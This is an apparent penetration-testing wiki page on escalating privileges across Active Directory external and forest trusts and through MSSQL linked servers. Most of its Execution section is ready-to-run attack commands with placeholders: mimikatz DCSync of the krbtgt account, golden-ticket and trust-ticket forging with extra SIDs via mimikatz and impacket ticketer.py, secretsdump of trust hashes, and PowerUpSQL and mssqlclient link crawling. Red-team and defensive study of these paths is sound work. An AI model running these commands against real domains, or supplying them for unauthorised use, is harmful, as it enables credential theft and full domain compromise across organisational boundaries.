# Cross-Forest and External

Across a forest boundary SID filtering normally applies, so escalation is narrower — but misconfigurations, over-scoped trusts, and MSSQL linked servers still cross it. This page covers the direction-by-direction cases and the database link path.

## Why It Works

Forest trusts are meant to be filtered, but administrators frequently relax filtering or grant cross-forest access for convenience. Linked SQL servers, in particular, tunnel trust across boundaries the directory would otherwise block.

## Prerequisites

* A foothold in one forest and an enumerated trust to another
* For the MSSQL path: linked-server access across the trust

## Execution

**External Trust**

* `DomainA <--> DomainB trust (B trust A, A trust B)`
  * from A to B FOREST\_TRANSITIVE
    * password reuse
      * **→ lat move (creds/pth/...)**
    * Foreign group and users
      * Users with foreign Domain Group Membership
        * `MATCH p=(n:User {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p` [\[tool\]](https://github.com/SpecterOps/BloodHound)
      * Group with foreign Domain Group Membership
        * `MATCH p=(n:Group {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p` [\[tool\]](https://github.com/SpecterOps/BloodHound)
          * **→ ACL**
    * SID History on B
      * Golden ticket
        * `mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt` [\[tool\]](https://github.com/gentilkiwi/mimikatz)
          * `mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID>-<GROUP_SID_SUP_1000> /ptt` [\[tool\]](https://github.com/gentilkiwi/mimikatz)
            * **→ PassTheTicket**
        * `ticketer.py -nthash <krbtgt> -domain-sid <domain_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid sup 1000> fakeuser` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
      * Trust ticket
        * `secretsdump.py -just-dc-user '<domainB>' <domainA>/<user>:'<password>'@<dc_a>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
          * `ticketer.py -nthash <trust_hash> -domain-sid <sid_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid sup 1000> -spn krbtgt/<domain_a> fakeuser` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
    * ADCS abuse
      * Unconstrained delegation
        * coerce dc\_b on dc\_a
          * **→ unconstrained delegation**
            * **→ ADCS**
  * from A to B is FOREST\_TRANSITIVE|TREAT\_AS\_EXTERNAL
* `DomainA <-- DomainB trust (B trust A / A access B)`
  * Same as double trust, but no unconstrained delegation as B can't connect to A
* `DomainA --> DomainB trust (A trust B / B access A)`
  * password reuse
    * **→ lat move (creds/pth/...)**

**Mssql links**

* MSSQL trusted links doesn't care of trust link
  * `Get-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance>` [\[tool\]](https://github.com/NetSPI/PowerUpSQL)
  * `mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)
    * trustlink
      * sp\_linkedservers
        * use\_link
          * **→ MSSQL**

## Related

* [Trust Enumeration](file:///9685693/trusts/trust-enumeration.md) — establishing direction and filtering
* [MSSQL Lateral Movement](file:///9685693/lateral-movement/mssql-lateral-movement.md) — the linked-server mechanics
